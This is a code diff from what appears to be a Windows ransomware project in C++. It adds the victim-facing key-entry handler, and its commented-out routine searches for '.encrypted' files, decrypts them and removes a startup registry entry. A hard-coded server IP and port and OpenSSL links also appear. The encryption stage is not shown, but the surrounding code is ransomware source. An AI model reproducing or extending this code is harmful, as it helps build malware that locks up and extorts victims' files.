@@ -18,10 +18,10 @@ using namespace std;
 
 LRESULT CALLBACK WinProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
 
-#pragma comment(linker, "/entry:wWinMainCRTStartup /subsystem:console")
+// #pragma comment(linker, "/entry:wWinMainCRTStartup /subsystem:console")
 #pragma comment(lib, "libssl.lib")
 #pragma comment(lib, "libcrypto.lib")
-
+HWND hEdit;
 const string SERVER_IP = "3.35.13.136";
 const int SERVER_PORT = 54000;
 #define IDC_MAIN_BUTTON	101			// Button identifier
@@ -190,7 +190,7 @@ Waits for user input and executes code depending on the action
 */
 LRESULT CALLBACK WinProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
-    HWND hEdit;
+
     switch (msg)
     {
         //Creates the text on screen by painting
@@ -265,7 +265,56 @@ LRESULT CALLBACK WinProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
             //Definded in header
         case IDC_MAIN_BUTTON:
         { 
+            /*
+            RSA* priKey = getPriKey();
+            DecryptDir(priKey, filename);
+            RSA_free(priKey);
+            */
+            
+            //Waits for get message, reads the text and inputs into wchar buffer
+            wchar_t* buffer[256];
+			SendMessage(hEdit, WM_GETTEXT, sizeof(buffer) / sizeof(buffer[0]), reinterpret_cast<LONG_PTR>(buffer));
+            std::wstring wkey = std::wstring((wchar_t*)buffer);
+            std::string key(wkey.begin(), wkey.end());
+            cout << key << "\n";
 
+
+            /*
+            Crypto Crypto(key);
+
+            //Checks to see if the key is correct
+            if (Crypto.checkKey(FileIO::readFile((std::wstring)tempPath).at(0)))
+            {
+
+                std::vector<std::wstring> fileLocations;
+                //Looks for all encrypted files
+                FileSearch::searchDir(fileLocations, docPath, (wchar_t*)L".encrypted");
+                //Same process as encrypt but in reverse
+                for (std::wstring& path : fileLocations)
+                {
+                    std::vector<std::string> data = FileIO::readFile(path);
+                    Crypto.decrypt(data);
+                    FileIO::removeFile(path);
+                    //Removes the encrypted extension and saves decrypted data
+                    FileIO::saveFile(path.erase(path.size() - 10), data);
+                }
+                //Removes encrypted files
+                FileIO::removeFile((std::wstring)tempPath);
+                //Removes startup registry
+                Registry::RemoveProgram();
+                //Sends message to user that the process was successfully complete
+                MessageBox(NULL, L"Files Succesfully Decrypted", L"Information", MB_ICONINFORMATION);
+                //Quits the program
+                PostQuitMessage(0);
+                return 0;
+            }
+            else
+            {
+                //Warns the user they entered an incorrect key
+                MessageBox(NULL, L"Incorrect Key", L"Warning", MB_ICONWARNING);
+            }
+            */
+            
         }
         break;
         }
